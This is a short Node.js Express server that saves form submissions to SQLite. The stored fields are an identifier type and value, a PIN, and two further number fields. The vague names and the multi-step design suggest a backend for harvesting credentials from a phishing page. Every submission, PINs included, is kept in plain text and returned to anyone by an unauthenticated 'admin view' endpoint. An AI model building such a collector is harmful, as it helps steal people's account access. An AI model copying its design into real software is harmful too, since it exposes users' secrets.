const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Initialize Permanent SQLite Database
const dbPath = path.join(__dirname, 'database.sqlite');
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error('Error opening database', err.message);
    } else {
        console.log('Connected to the permanent SQLite database.');
    }
});

// Create table for submissions if it doesn't exist
db.run(`CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    identifierType TEXT,
    identifierValue TEXT,
    pinText TEXT,
    numericValue TEXT,
    anyNumberValue TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`, (err) => {
    if (err) {
        console.error('Error creating table', err.message);
    }
});

// API endpoint to save multi-step records permanently
app.post('/api/submit', (req, res) => {
    const { identifierType, identifierValue, pinText, numericValue, anyNumberValue } = req.body;

    const query = `INSERT INTO submissions (identifierType, identifierValue, pinText, numericValue, anyNumberValue) VALUES (?, ?, ?, ?, ?)`;
    const params = [identifierType, identifierValue, pinText, numericValue, anyNumberValue];

    db.run(query, params, function(err) {
        if (err) {
            console.error('Database insert error:', err.message);
            return res.status(500).json({ success: false, error: err.message });
        }
        res.status(200).json({ success: true, id: this.lastID });
    });
});

// API endpoint to view all stored submissions (Admin view)
app.get('/api/submissions', (req, res) => {
    const query = `SELECT * FROM submissions ORDER BY created_at DESC`;
    db.all(query, [], (err, rows) => {
        if (err) {
            console.error('Database fetch error:', err.message);
            return res.status(500).json({ success: false, error: err.message });
        }
        res.status(200).json({ success: true, count: rows.length, data: rows });
    });
});

// Start Server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
